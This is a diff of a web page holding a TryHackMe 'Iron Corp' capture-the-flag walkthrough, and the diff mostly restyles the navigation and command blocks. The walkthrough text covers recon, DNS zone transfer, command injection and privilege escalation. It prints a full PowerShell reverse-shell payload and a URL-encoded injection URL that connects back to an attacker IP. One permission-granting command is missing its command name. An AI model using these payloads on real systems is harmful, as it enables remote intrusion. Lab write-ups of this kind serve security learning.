@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="description" content="Offensive security writeups, penetration testing labs, and CTF walkthroughs focused on web, network, and privilege escalation techniques.">
     <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe writeups, HackTheBox, CTF, cybersecurity, ethical hacking">
     <meta name="author" content="xlondra">
@@ -19,26 +19,32 @@
     <link rel="stylesheet" href="../../../assets/css/code.css">
     <link rel="stylesheet" href="../../../assets/css/explain.css">
 
+    <script src="../../../assets/js/nav.js" defer></script>
     <script src="../../../assets/js/footer.js" defer></script>
     <script src="../../../assets/js/zoomer.js" defer></script>
+    <script src="../../../assets/js/writeup.js" defer></script>
 
 </head>
 <body>
-    <nav>
-        <div class="terminal">
-            <span class="prompt">londra@kali $> </span>
-            <span class="typed"></span><span class="cursor">_</span>
-        </div>
-        <div>
-            <a href="../../../index.html">Home</a>
-            <a href="../../../writeuplist.html">Writeups</a>
-            <a href="../../../contact.html">Contact</a>
-        </div>
-    </nav>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali $> </span>
+                <span class="typed"></span><span class="cursor">_</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+            </div>
+            <div class="hamburger-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor"><path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/></svg></div>
+        </nav>
+    </header>
 
     <main>
         <article class="writeup">
-            <header class="lab-header">
+            <div class="lab-header">
                 <h1 class="lab-title">TryHackMe - Iron Corp - Walktrough</h1>
 
                 <ul class="lab-meta">
@@ -52,22 +58,22 @@
                         <span class="tag">DNS</span>
                     </li>
                 </ul>
-            </header>
+            </div>
 
             <section class="writeup-section">
                 <h2 class="section-title">Reconnaissance</h2>
 
-                <p>Let’s start by scanning the target network with Nmap.</p>
+                <p>Let's start by scanning the target network with Nmap.</p>
                 <img src="images/nmap1.png" class="lab-image zoomable">
 
-                <pre><code>└─$ sudo nmap -p- ironcorp.me -Pn</code></pre>
+                <div class="command-wrapper"><pre><code data-copy-content="sudo nmap -p- ironcorp.me -Pn">└─$ sudo nmap -p- ironcorp.me -Pn</code></pre></div>
 
                 <p>This shows 7 open ports.<br>
                 Next, we run a version scan to identify what is running on those ports.
                 </p>
                 <img src="images/nmap2.png" class="lab-image zoomable">
                 
-                <pre><code>└─$ sudo nmap -p53,135,3389,8080,11025,49668,49670 -sV ironcorp.me -Pn</code></pre>
+                <div class="command-wrapper"><pre><code data-copy-content="sudo nmap -p53,135,3389,8080,11025,49668,49670 -sV ironcorp.me -Pn">└─$ sudo nmap -p53,135,3389,8080,11025,49668,49670 -sV ironcorp.me -Pn</code></pre></div>
             </section>
 
             <section class="writeup-section">
@@ -86,7 +92,7 @@
                     I used the following command:
                 </p>
 
-                <pre><code>└─$ sudo dig axfr ironcorp.me @10.114.170.40</code></pre>
+                <div class="command-wrapper"><pre><code data-copy-content="sudo dig axfr ironcorp.me @10.114.170.40">└─$ sudo dig axfr ironcorp.me @10.114.170.40</code></pre></div>
 
                 <details class="command-explanation">
                     <summary>What this command does</summary>
@@ -164,14 +170,14 @@ with open(rockyou, "r", encoding="latin-1") as f:
                 <img src="images/adminpage.png" class="lab-image zoomable">
 
                 <p>I tested various inputs. At first, nothing stood out.<br>
-                    Then I tried <b>dir</b>, the Windows equivalent of <b>ls -la</b>.<br>
+                    Then I tried <b>dir</b>, the Windows equivalent of <b>ls</b>.<br>
                     The command took noticeably longer to respond, suggesting that it was being executed. <br>
                     This indicates a <b>command injection vulnerability</b>.<br>
 
                     However, spaces were not allowed, meaning only a single argument could be used.<br>
                     I hosted a web server using Python:
                 </p>
-                <pre><code>└─$ sudo python3 -m http.server 8080</code></pre>
+                <div class="command-wrapper"><pre><code data-copy-content="sudo python3 -m http.server 8080">└─$ sudo python3 -m http.server 8080</code></pre></div>
                 <p>I placed a file named shell.ps1 in the web root and entered its URL in the search bar.</p>
                 <span class="path">http://192.168.169.133:8080/shell.ps1</span>
 
@@ -198,14 +204,13 @@ with open(rockyou, "r", encoding="latin-1") as f:
                 <img src="images/mynameisNT.png" class="lab-image zoomable">
                 <p>This confirmed that commands were being executed as <b>NT AUTHORITY\SYSTEM</b>.<br>
                     I set up a Netcat listener on port 4444</p>
-                <pre><code>└─$ nc -nvlp 4444</code></pre>
+                <div class="command-wrapper"><pre><code data-copy-content="nc -nvlp 4444">└─$ nc -nvlp 4444</code></pre></div>
 
                 <p>I then used a PowerShell reverse shell payload.</p>
-                <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>
+                <div class="command-wrapper"><pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre></div>
 
                 <p>Because spaces were not allowed, I URL-encoded the payload and injected it via the vulnerable parameter.</p>
-                <span class="path">http://internal.ironcorp.me:11025/name.php?name=http://internal.ironcorp.me:11025/name.php?name=%7cpowershell%20%2DNoP%20%2DNonI%20%2DW%20Hidden%20%2DExec%20Bypass%20%2DCommand%20%22%24client%20%3D%20New%2DObject%20System%2ENet%2ESockets%2ETCPClient%28%27192%2E168%2E169%2E133%27%2C4444%29%3B%24stream%20%3D%20%24client%2EGetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200%2E%2E65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream%2ERead%28%24bytes%2C0%2C%24bytes%2ELength%29%29%20%2Dne%200%29%7B%3B%24data%20%3D%20%28New%2DObject%20%2DTypeName%20System%2EText%2EASCIIEncoding%29%2EGetString%28%24bytes%2C0%2C%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out%2DString%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29%2EPath%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext%2Eencoding%5D%3A%3AASCII%29%2EGetBytes%28%24sendback2%29%3B%24stream%2EWrite%28%24sendbyte%2C0%2C%24sendbyte%2ELength%29%3B%24stream%2EFlush%28%29%7D%3B%24client%2EClose%28%29%22</span>
-            
+                <div class="command-wrapper"><pre><code data-copy-content="http://internal.ironcorp.me:11025/name.php?name=http://internal.ironcorp.me:11025/name.php?name=%7cpowershell%20%2DNoP%20%2DNonI%20%2DW%20Hidden%20%2DExec%20Bypass%20%2DCommand%20%22%24client%20%3D%20New%2DObject%20System%2ENet%2ESockets%2ETCPClient%28%27192%2E168%2E169%2E133%27%2C4444%29%3B%24stream%20%3D%20%24client%2EGetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200%2E%2E65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream%2ERead%28%24bytes%2C0%2C%24bytes%2ELength%29%29%20%2Dne%200%29%7B%3B%24data%20%3D%20%28New%2DObject%20%2DTypeName%20System%2EText%2EASCIIEncoding%29%2EGetString%28%24bytes%2C0%2C%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out%2DString%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29%2EPath%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext%2Eencoding%5D%3A%3AASCII%29%2EGetBytes%28%24sendback2%29%3B%24stream%2EWrite%28%24sendbyte%2C0%2C%24sendbyte%2ELength%29%3B%24stream%2EFlush%28%29%7D%3B%24client%2EClose%28%29%22">http://internal.ironcorp.me:11025/name.php?name=http://internal.ironcorp.me:11025/name.php?name=%7cpowershell%20%2DNoP%20%2DNonI%20%2DW%20Hidden%20%2DExec%20Bypass%20%2DCommand%20%22%24client%20%3D%20New%2DObject%20System%2ENet%2ESockets%2ETCPClient%28%27192%2E168%2E169%2E133%27%2C4444%29%3B%24stream%20%3D%20%24client%2EGetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200%2E%2E65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream%2ERead%28%24bytes%2C0%2C%24bytes%2ELength%29%29%20%2Dne%200%29%7B%3B%24data%20%3D%20%28New%2DObject%20%2DTypeName%20System%2EText%2EASCIIEncoding%29%2EGetString%28%24bytes%2C0%2C%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out%2DString%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29%2EPath%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext%2Eencoding%5D%3A%3AASCII%29%2EGetBytes%28%24sendback2%29%3B%24stream%2EWrite%28%24sendbyte%2C0%2C%24sendbyte%2ELength%29%3B%24stream%2EFlush%28%29%7D%3B%24client%2EClose%28%29%22</code></pre></div>
                 <p>And voila, a reverse shell is born:</p>
                 <img src="images/proofReverseShell.png" class="lab-image zoomable">
             </section>
@@ -221,7 +226,7 @@ with open(rockyou, "r", encoding="latin-1") as f:
                 </p>
 
                 <p>I checked my privileges using:</p>
-                <pre><code>PS C:\> whoami /all</code></pre>
+                <div class="command-wrapper"><pre><code data-copy-content="whoami /all">PS C:\> whoami /all</code></pre></div>
                 <img src="images/whoamiall.png" class="lab-image zoomable">
 
                 <p>The output showed that <b>SeImpersonatePrivilege</b> was enabled.<br>
@@ -231,9 +236,9 @@ with open(rockyou, "r", encoding="latin-1") as f:
                 <span class="path">C:\Users\SuperAdmin\Desktop\root.txt</span>
 
                 <p>First, I took ownership of the directory and granted full access.</p>
-                <pre><code>PS C:\Users\SuperAdmin> takeown /f C:\Users\SuperAdmin\Desktop /r /d y</code></pre>
-                <pre><code>PS C:\Users\SuperAdmin> C:\Users\SuperAdmin\Desktop /grant Everyone:F /t</code></pre>
-                <pre><code>PS C:\Users\SuperAdmin> type C:\Users\SuperAdmin\Desktop\root.txt</code></pre>
+                <div class="command-wrapper"><pre><code data-copy-content="PS C:\Users\SuperAdmin> takeown /f C:\Users\SuperAdmin\Desktop /r /d y">PS C:\Users\SuperAdmin> takeown /f C:\Users\SuperAdmin\Desktop /r /d y</code></pre></div>
+                <div class="command-wrapper"><pre data-copy-content="PS C:\Users\SuperAdmin> C:\Users\SuperAdmin\Desktop /grant Everyone:F /t"><code>PS C:\Users\SuperAdmin> C:\Users\SuperAdmin\Desktop /grant Everyone:F /t</code></pre></div>
+                <div class="command-wrapper"><pre data-copy-content="PS C:\Users\SuperAdmin> type C:\Users\SuperAdmin\Desktop\root.txt"><code>PS C:\Users\SuperAdmin> type C:\Users\SuperAdmin\Desktop\root.txt</code></pre></div>
 
                 <p>My assumption was correct:</p>
                 <img src="images/rootflag.png" class="lab-image zoomable">
